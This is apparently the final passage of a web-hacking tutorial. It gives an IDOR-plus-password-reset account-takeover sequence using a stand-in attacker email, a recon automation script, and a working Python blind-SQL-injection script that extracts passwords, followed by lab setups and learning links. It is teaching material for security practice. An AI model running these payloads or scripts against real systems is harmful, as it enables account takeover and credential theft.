**Exploit Flow:**
```http
# 1. Change email (IDOR)
POST /api/user/123/update HTTP/1.1
{"email": "attacker@evil.com"}

# 2. Request password reset
POST /api/password-reset HTTP/1.1
{"email": "victim@example.com"}

# 3. Link arrives at attacker's email
# 4. Account compromised!
```

### 🤖 Automation & Custom Scripts

**Recon Automation (Bash):**
```bash
#!/bin/bash
TARGET=$1

echo "[+] Subdomain Enumeration"
subfinder -d $TARGET -o subdomains.txt

echo "[+] Port Scanning"
nmap -iL subdomains.txt -oA nmap_scan

echo "[+] Directory Bruteforce"
while read subdomain; do
    ffuf -u "https://$subdomain/FUZZ" -w wordlist.txt -o "$subdomain-dirs.json"
done < subdomains.txt

echo "[+] Vulnerability Scanning"
nuclei -l subdomains.txt -t ~/nuclei-templates/
```

**Custom SQLi Exploiter (Python):**
```python
import requests
import string

def blind_sqli_exploit(url, parameter):
    result = ""
    
    for position in range(1, 50):
        for char in string.printable:
            payload = f"' AND SUBSTRING(password,{position},1)='{char}'--"
            
            params = {parameter: payload}
            response = requests.get(url, params=params)
            
            if "Welcome" in response.text:
                result += char
                print(f"[+] Found: {result}")
                break
        
        if char == ' ':  # Complete
            break
    
    return result

password = blind_sqli_exploit("http://example.com/login.php", "username")
print(f"[+] Password: {password}")
```

---

## Resources and Lab Environments

### 🧪 Practice Platforms

**1. OWASP WebGoat**
```bash
docker run -p 8080:8080 webgoat/goatandwolf
```

**2. DVWA (Damn Vulnerable Web Application)**
```bash
docker run -p 80:80 vulnerables/web-dvwa
```

**3. bWAPP**
```bash
docker run -p 80:80 raesene/bwapp
```

**4. HackTheBox & TryHackMe**
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

### 📚 Learning Resources

**Books:**
- The Web Application Hacker's Handbook
- OWASP Testing Guide
- Bug Bounty Bootcamp

**Video Courses:**
- Portswigger Web Security Academy
- PentesterLab
- HackerOne Hacktivity

**Cheat Sheets:**
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)

---

## 🎓 Conclusion

This guide is designed to transform you from **zero to professional web security expert**.

**Reminder:**
- ✅ Only test on your own systems or systems you have permission to test
- ✅ Participate in bug bounty programs (legal)
- ✅ Practice continuously
- ✅ Learn with the community (Discord, Reddit, Twitter)

> **"Security is not a product, but a process."** - Bruce Schneier

**Good luck! 🚀**

---

**Author:** Cybersecurity Education Team  
**Version:** 1.0 (2024)  
**License:** MIT